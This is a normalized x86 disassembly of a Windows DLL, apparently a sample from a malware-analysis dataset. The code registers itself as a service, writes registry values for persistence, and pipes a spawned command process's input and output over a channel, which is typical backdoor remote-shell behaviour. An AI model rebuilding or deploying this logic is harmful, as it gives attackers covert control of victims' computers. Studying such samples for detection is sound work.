push ebx
push rw-data
push eax
mov [ ebp - 0x44 ] 0x1f4
call [ RegQueryValueExA@IAT ]
mov ecx [ ebp - 0x14 ]
mov esi eax
push ecx
mov [ ebp + 0x8 ] esi
call [ RegCloseKey@IAT ]
push esi
call [ SetLastError@IAT ]
cmp esi ebx
je r-xdata
push eax
push rw-data
push rw-data
call sub_10005e80
add esp 0xc
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] rw-data
push r--data
push edx
call sub_1000870c
mov [ ebp - 0x1c ] eax
mov edi eax
lea esi [ ebp - 0x248 ]
lea edx [ ebp - 0x34 ]
push r--data
push edx
mov [ ebp - 0x34 ] rw-data
call sub_1000870c
push rw-data
call sub_10005e80
add esp 0x4
lea esi [ ebp - 0x248 ]
push edi
push esi
call sub_1000efd0
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebp - 0x28 ]
push r--data
push eax
mov [ ebp - 0x28 ] rw-data
call sub_1000870c
push esi
push rw-data
call sub_10005e80
add esp 0x8
push ebx
push esi
call sub_10008650
add esp 0x8
inc eax
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push ebx
push esi
call sub_10008650
add esp 0x8
inc eax
mov esi eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
push 0x1
push 0x2
push 0x10
push 0xf01ff
push 0x0
push edi
push ebx
call [ CreateServiceA@IAT ]
mov esi eax
test esi esi
mov [ ebp - 0x24 ] esi
jne r-xdata
lea ecx [ ebp - 0x3c ]
push r--data
push ecx
mov [ ebp - 0x3c ] rw-data
call sub_1000870c
cmp [ esi ] 0x0
je r-xdata
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov ebx eax
test ebx ebx
mov [ ebp - 0x20 ] ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
push rw-data
call sub_10005e80
add esp 0x8
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push ebx
call esi
push 0x1f4
lea eax [ ebp - 0x248 ]
push rw-data
push eax
mov [ ebp - 0x14 ] 0x80000002
call sub_10007bc0
push 0x64
lea ecx [ ebp - 0x248 ]
push edi
push ecx
call sub_10008510
mov ecx [ ebp - 0x14 ]
add esp 0x18
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x248 ]
push edx
push 0xf003f
push 0x0
push eax
push ecx
call [ RegOpenKeyExA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
call [ GetLastError@IAT ]
push eax
push edi
push rw-data
mov [ ebp + 0x8 ] eax
call sub_10005e80
add esp 0xc
lea edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] rw-data
push r--data
push edx
call sub_1000870c
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
push rw-data
push ecx
call [ RegCreateKeyA@IAT ]
mov edi eax
push edi
mov [ ebp + 0x8 ] edi
call [ SetLastError@IAT ]
test edi edi
je r-xdata
push eax
push edi
push rw-data
call sub_10005e80
add esp 0xc
lea edx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] rw-data
push r--data
push edx
call sub_1000870c
mov ecx [ rw-data ]
lea eax [ ebp - 0x248 ]
push 0x1f4
push eax
push ecx
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x30 ]
push r--data
push edx
mov [ ebp - 0x30 ] rw-data
call sub_1000870c
lea edi [ ebp - 0x248 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
lea eax [ ebp - 0x248 ]
push ecx
mov ecx [ ebp - 0x18 ]
push eax
push 0x2
push 0x0
push rw-data
push ecx
call [ RegSetValueExA@IAT ]
mov edi eax
push edi
mov [ ebp + 0x8 ] edi
call [ SetLastError@IAT ]
test edi edi
je r-xdata
lea edx [ ebp - 0x38 ]
push r--data
push edx
mov [ ebp - 0x38 ] rw-data
call sub_1000870c
mov eax [ ebp - 0x1c ]
push eax
push rw-data
call sub_10005e80
add esp 0x8
jmp r-xdata
lea edx [ ebp - 0x40 ]
push r--data
push edx
mov [ ebp - 0x40 ] rw-data
call sub_1000870c
mov ecx [ ebp - 0x14 ]
push ecx
call [ RegCloseKey@IAT ]
mov edx [ ebp - 0x18 ]
push edx
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x24 ]
push eax
call esi
push ebx
call esi
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_10005ca4
mov esi [ ebp - 0x54 ]
test esi esi
je r-xdata
mov eax r-xdata
retn
cmp [ esi ] 0x0
je r-xdata
call [ GetLastError@IAT ]
push eax
push esi
push rw-data
mov [ ebp + 0x8 ] eax
call sub_10005e80
add esp 0xc
UninstallService
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] esi
push 0xf003f
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov ebx eax
mov [ ebp - 0x24 ] ebx
cmp ebx esi
jne r-xdata
mov edi rw-data
mov [ ebp - 0x28 ] edi
mov eax [ ebp + 0x8 ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
push esi
push rw-data
call sub_10005e80
add esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x10000
push edi
push ebx
call [ OpenServiceA@IAT ]
mov esi eax
mov [ ebp - 0x20 ] esi
test esi esi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
push esi
push edi
push rw-data
call sub_10005e80
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
call [ DeleteService@IAT ]
test eax eax
jne r-xdata
mov edi eax
mov [ ebp - 0x28 ] edi
push edi
push rw-data
call sub_10005e80
add esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push ebx
call esi
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10005e80
mov ecx [ esp + 0x4 ]
sub esp 0x42c
lea eax [ esp + 0x434 ]
lea edx [ esp + 0x2c ]
push esi
push eax
push ecx
push 0x400
push edx
call sub_10008ac1
add esp 0x10
push 0xfffffff5
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push rw-data
push rw-data
call sub_10008136
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push edi
lea eax [ esp + 0x8 ]
push 0x0
push eax
lea edi [ esp + 0x3c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi [ WriteFile@IAT ]
dec ecx
push ecx
lea ecx [ esp + 0x40 ]
push ecx
push esi
call edi
lea edx [ esp + 0x8 ]
push 0x0
push edx
push 0x2
push rw-data
push esi
call edi
pop edi
jmp r-xdata
lea ecx [ esp + 0x30 ]
push ecx
call [ OutputDebugStringA@IAT ]
pop esi
add esp 0x42c
retn
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x8 ]
push eax
push ecx
call sub_10008a48
add esp 0x4
lea edx [ esp + 0x20 ]
push eax
push edx
call sub_100089c4
add esp 0x4
push eax
push rw-data
push esi
call sub_10008988
mov eax rw-data
add esp 0x14
test eax eax
jne r-xdata
push esi
call sub_10007fcf
add esp 0x4
sub_10005f60
push ecx
lea eax [ esp ]
push eax
push 0x0
push 0x0
push sub_10005f90
push 0x0
push 0x0
call [ CreateThread@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop ecx
retn
push eax
call [ CloseHandle@IAT ]
sub_10005fa0
push esi
push edi
mov esi ecx
call sub_10002160
xor edi edi
mov [ esi ] r--data
push edi
push edi
push 0x1
push edi
call [ CreateEventA@IAT ]
mov [ esi + 0x7c ] eax
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov [ esi + 0x9c ] edi
mov [ esi + 0xa0 ] edi
mov eax esi
pop edi
pop esi
retn
sub_10006030
mov eax [ esp + 0xc ]
sub esp 0x894
mov edx [ esp + 0x898 ]
push ebx
push esi
mov esi ecx
push edi
mov ecx [ esp + 0x8a8 ]
push 0xfa2
push eax
push ecx
push edx
mov ecx esi
call sub_100028b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x894
retn 0xc
xor ebx ebx
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x21 ]
mov [ esp + 0x20 ] bl
mov [ esp + 0x18 ] ebx
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x20 ]
lea ecx [ esi + 0x70 ]
push eax
call sub_10001840
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x20 ]
push ecx
push 0x80
push edx
mov ecx esi
call sub_10002dc0
test al al
je r-xdata
mov ecx esi
call sub_10002cf0
test al al
je r-xdata
mov ecx esi
call sub_100062e0
test eax eax
je r-xdata
push ebp
push 0x3e8
call [ Sleep@IAT ]
mov eax [ esi + 0x7c ]
mov ebp [ WaitForSingleObject@IAT ]
push ebx
push eax
mov [ esp + 0x28 ] ebx
call ebp
cmp eax 0x102
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
mov eax [ esi + 0x88 ]
push ebx
not ecx
dec ecx
push edx
push ecx
push rw-data
push eax
call [ WriteFile@IAT ]
mov ecx [ esi + 0x7c ]
push ecx
call [ SetEvent@IAT ]
mov edx [ esi + 0xa0 ]
push ebx
push edx
call [ TerminateProcess@IAT ]
mov eax [ esi + 0x80 ]
mov edi [ CloseHandle@IAT ]
push eax
call edi
mov ecx [ esi + 0x90 ]
push ecx
call edi
mov edx [ esi + 0x88 ]
push edx
call edi
mov eax [ esi + 0x94 ]
push eax
call edi
mov ecx esi
call sub_10003200
pop ebp
mov ecx 0xff
xor eax eax
lea edi [ esp + 0xa5 ]
mov [ esp + 0xa4 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x4a5 ]
mov [ esp + 0x4a4 ] bl
[ edi ]
stosw [ edi ]
push ebx
lea ecx [ esp + 0x18 ]
push ebx
push ecx
stosb [ edi ]
mov eax [ esi + 0x94 ]
lea edx [ esp + 0xb0 ]
push 0x400
push edx
push eax
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0x94 ]
lea ecx [ esp + 0x10 ]
push ebx
push ecx
lea edx [ esp + 0xac ]
push 0x400
push edx
push eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x14 ]
mov ecx esi
sub edx eax
mov [ esp + 0x14 ] edx
call sub_10002cc0
test al al
je r-xdata
lea ecx [ esp + 0x10 ]
push 0x4
push ecx
mov ecx esi
call sub_10002d80
test al al
je r-xdata
mov edx [ esp + 0x10 ]
lea eax [ esp + 0xa4 ]
push edx
push eax
mov ecx esi
call sub_10002d80
test al al
je r-xdata
mov ecx esi
call sub_10002cf0
test al al
je r-xdata
lea ecx [ esp + 0x18 ]
push 0x4
push ecx
mov ecx esi
call sub_10002d20
test al al
je r-xdata
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x7c ]
push ebx
push ecx
call ebp
cmp eax 0x102
je r-xdata
lea edx [ esp + 0x4a4 ]
push eax
push edx
mov ecx esi
call sub_10002d20
test al al
je r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x18 ]
push ebx
push eax
mov eax [ esi + 0x88 ]
lea edx [ esp + 0x4ac ]
push ecx
push edx
push eax
call [ WriteFile@IAT ]
test eax eax
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
sub_100062e0
sub esp 0xc
push ebx
mov ebx [ GetStdHandle@IAT ]
push ebp
push esi
push edi
mov esi ecx
push 0xfffffff5
mov [ esp + 0x14 ] 0xc
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x18 ] 0x0
call ebx
mov [ esi + 0x9c ] eax
lea eax [ esp + 0x10 ]
lea ebp [ esi + 0x90 ]
push 0x0
lea edi [ esi + 0x8c ]
push eax
push ebp
push edi
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp ]
push ecx
push 0xfffffff5
call [ SetStdHandle@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ebp [ GetCurrentProcess@IAT ]
push 0x2
push 0x0
lea edx [ esi + 0x94 ]
push 0x0
push edx
call ebp
push eax
mov eax [ edi ]
push eax
call ebp
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ecx [ edi ]
push ecx
call [ CloseHandle@IAT ]
push 0xfffffff6
call ebx
lea edx [ esp + 0x10 ]
lea edi [ esi + 0x84 ]
push 0x0
lea ebx [ esi + 0x80 ]
push edx
push edi
push ebx
mov [ esi + 0x98 ] eax
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov eax [ ebx ]
mov ebx [ SetStdHandle@IAT ]
push eax
push 0xfffffff6
call ebx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
push 0x2
push 0x0
lea ecx [ esi + 0x88 ]
push 0x0
push ecx
call ebp
mov edx [ edi ]
push eax
push edx
call ebp
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov eax [ edi ]
push eax
call [ CloseHandle@IAT ]
mov ecx esi
call sub_10006450
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ecx [ esi + 0x98 ]
push ecx
push 0xfffffff6
call ebx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov edx [ esi + 0x9c ]
push edx
push 0xfffffff5
call ebx
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0xc
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
sub_10006450
sub esp 0x158
push ebx
push ebp
mov ebx ecx
push edi
mov ecx 0x11
xor eax eax
lea edi [ esp + 0xc ]
push 0x104
[ edi ]
mov eax [ ebx + 0x80 ]
lea ecx [ esp + 0x64 ]
mov [ esp + 0x48 ] eax
mov eax [ ebx + 0x90 ]
xor ebp ebp
push ecx
push rw-data
mov [ esp + 0x18 ] 0x44
mov [ esp + 0x1c ] ebp
mov [ esp + 0x4c ] ebp
mov [ esp + 0x4a ] bp
mov [ esp + 0x20 ] ebp
mov [ esp + 0x44 ] 0x101
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x48 ] bp
call [ GetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x64 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x54 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x68 ]
push ecx
push ebp
push ebp
push 0x8000000
push 0x1
push ebp
push ebp
push edx
push ebp
call [ CreateProcessA@IAT ]
cmp eax ebp
pop esi
je r-xdata
pop edi
pop ebp
pop ebx
add esp 0x158
retn
pop edi
pop ebp
pop ebx
add esp 0x158
retn
mov ecx [ esp + 0x50 ]
mov [ ebx + 0xa0 ] ecx
sub_100065ad
mov eax sub_1001a32f
call sub_10008d90
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_100065e9
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x14 ]
call sub_10014bf1
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_100065e9
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_10014331
and [ esi + 0x4 ] 0x0
pop ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_10014331
and [ esi + 0x8 ] 0x0
pop ecx
pop esi
retn
cmp eax 0xffffffff
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x48 ]
and [ esi + 0xc ] 0x0
sub_10006633
push ebp
push esi
push edi
mov esi ecx
call sub_100065e9
push 0x140
call sub_10014308
mov ebp [ esp + 0x14 ]
and [ esi + 0x10 ] 0x0
test ebp ebp
pop ecx
mov [ esi + 0x8 ] eax
jne r-xdata
add eax 0x2c
push ebp
push eax
call [ lstrcpyA@IAT ]
push [ esi + 0x8 ]
push ebp
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esi + 0xc ] eax
jne r-xdata
mov ebp r--data
push ebx
mov ebx 0x104
lea ecx [ esi + 0x14 ]
push ebx
mov [ esp + 0x18 ] ecx
call sub_10014e02
mov edi eax
push ebx
push ebp
push edi
call sub_10008e21
add esp 0xc
test eax eax
pop ebx
jne r-xdata
call [ GetLastError@IAT ]
mov ecx esi
mov edi eax
call sub_100065e9
push edi
jmp r-xdata
push 0x5c
push edi
call sub_10008daf
push 0x2f
push edi
mov esi eax
call sub_10008daf
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push 0xffffffff
call sub_10014dda
mov ecx esi
call sub_100065e9
push 0x7b
call [ SetLastError@IAT ]
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
cmp eax esi
jb r-xdata
mov esi edi
mov ecx [ esp + 0x10 ]
push 0xffffffff
call sub_10014dda
push 0x1
pop eax
mov eax edi
and [ esi ] 0x0
and [ eax ] 0x0
jmp r-xdata
sub_1000672d
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ eax + 0xc ]
push 0x1
mov [ ecx ] edx
mov eax [ eax + 0x10 ]
mov [ ecx + 0x4 ] eax
pop eax
jmp r-xdata
retn 0x4
sub_10006751
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x14 ]
push 0x1
mov [ ecx ] edx
mov eax [ eax + 0x18 ]
mov [ ecx + 0x4 ] eax
pop eax
jmp r-xdata
retn 0x4
sub_10006775
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x4 ]
push 0x1
mov [ ecx ] edx
mov eax [ eax + 0x8 ]
mov [ ecx + 0x4 ] eax
pop eax
jmp r-xdata
retn 0x4
sub_10006799
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
add eax 0xc
push 0xffffffff
push eax
lea ecx [ ebp - 0x4 ]
call sub_10013e8e
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
push 0x1
mov [ ecx ] eax
pop eax
jmp r-xdata
leave
retn 0x4
sub_100067c4
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
add eax 0x14
push 0xffffffff
push eax
lea ecx [ ebp - 0x4 ]
call sub_10013e8e
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
push 0x1
mov [ ecx ] eax
pop eax
jmp r-xdata
leave
retn 0x4
sub_100067ef
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
add eax 0x4
push 0xffffffff
push eax
lea ecx [ ebp - 0x4 ]
call sub_10013e8e
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
push 0x1
mov [ ecx ] eax
pop eax
jmp r-xdata
leave
retn 0x4
sub_1000681a
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x4 ] edi
je r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ esi ]
push 0x10
call [ eax + 0x38 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x2c ] 0x2e
jne r-xdata
mov cl [ eax + 0x2d ]
test cl cl
je r-xdata
push 0x1
pop edi
cmp cl 0x2e
jne r-xdata
cmp [ eax + 0x2e ] 0x0
jne r-xdata
sub_10006853
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
push edi
lea edi [ esi + 0x4 ]
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ edi ]
mov ecx [ esi + 0x8 ]
push eax
mov [ edi ] ecx
push [ esi + 0xc ]
mov [ esi + 0x8 ] eax
call [ FindNextFileA@IAT ]
pop edi
pop esi
retn
push 0x140
call sub_10014308
pop ecx
mov [ edi ] eax
sub_1000688e
mov eax sub_1001a363
call sub_10008d90
sub esp 0xc
and [ ebp - 0x18 ] 0x0
push ebx
push esi
mov esi ecx
push r--data
lea ecx [ ebp - 0x10 ]
call sub_10014c1b
mov eax [ esi ]
push 0x1
pop ebx
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0x10 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
call sub_10014d73
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_10014bf1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10014966
mov [ ebp - 0x18 ] ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_10014bf1
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_10006922
mov eax sub_1001a397
call sub_10008d90
sub esp 0xc
push ebx
and [ ebp - 0x18 ] 0x0
push esi
mov esi ecx
lea ecx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
push eax
call sub_10014966
mov eax [ ebp - 0x10 ]
push 0x1
pop ebx
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x4 ] ebx
cmp [ ecx + eax - 0x1 ] 0x5c
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx esi
call [ eax + 0xc ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
call sub_10014d73
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_10014bf1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10014966
mov [ ebp - 0x18 ] ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_10014bf1
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ecx + eax - 0x1 ] 0x2f
je r-xdata
mov al [ esi + 0x18 ]
lea ecx [ ebp - 0x10 ]
push eax
call sub_10014d5e
sub_100069ba
mov eax sub_1001a3cb
call sub_10008d90
sub esp 0xc
mov eax [ ecx ]
and [ ebp - 0x18 ] 0x0
push ebx
lea edx [ ebp - 0x14 ]
push esi
push edx
call [ eax + 0xc ]
mov eax [ rw-data ]
push 0x1
pop ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x14 ]
push 0x0
push 0x104
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
call sub_10014d8b
push eax
push 0x0
push 0x0
push esi
call sub_10008ec6
add esp 0x14
lea ecx [ ebp - 0x10 ]
push 0xffffffff
call sub_10014dda
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10014966
mov [ ebp - 0x18 ] ebx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] bl
call sub_10014bf1
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_10014bf1
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_10006a4b
mov eax sub_1001a3f7
call sub_10008d90
push ecx
push ecx
mov eax [ rw-data ]
and [ ebp - 0x14 ] 0x0
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x4 ]
push 0x1
pop esi
test eax eax
mov [ ebp - 0x4 ] esi
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10014966
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_10014bf1
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
add eax 0x2c
lea ecx [ ebp - 0x10 ]
push eax
call sub_10014c9a
sub_10006bb7
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0xc ] 0x0
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x10 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x8
sub_10006bf3
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
push edi
call [ EnterCriticalSection@IAT ]
mov ecx [ esi + 0x8 ]
call sub_10013fd0
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
push edi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
retn
sub_10006c1b
mov eax sub_1001a508
call sub_10008d90
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov edi [ esi + 0xc ]
push ebx
mov eax [ edi ]
mov [ esi + 0xc ] eax
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push [ esi ]
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x8 ]
push [ esi + 0x4 ]
push eax
call sub_10013fb0
mov ecx [ esi + 0x4 ]
dec ecx
mov edx ecx
imul edx [ esi ]
test ecx ecx
lea eax [ edx + eax + 0x4 ]
jl r-xdata
inc ecx
mov edx [ esi + 0xc ]
mov [ eax ] edx
mov [ esi + 0xc ] eax
sub eax [ esi ]
dec ecx
jne r-xdata
sub_10006caa
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x4
push ebx
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0xc ]
push ebx
mov [ edi ] eax
mov [ esi + 0xc ] edi
call [ LeaveCriticalSection@IAT ]
pop ebx
sub_10006cea
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
setne al
jmp r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] 0x1
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push 0x1
pop eax
mov [ rw-data ] eax
jmp r-xdata
sub_10006dc2
push esi
push edi
call sub_10006cea
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x3
jne r-xdata
push [ esp + 0x10 ]
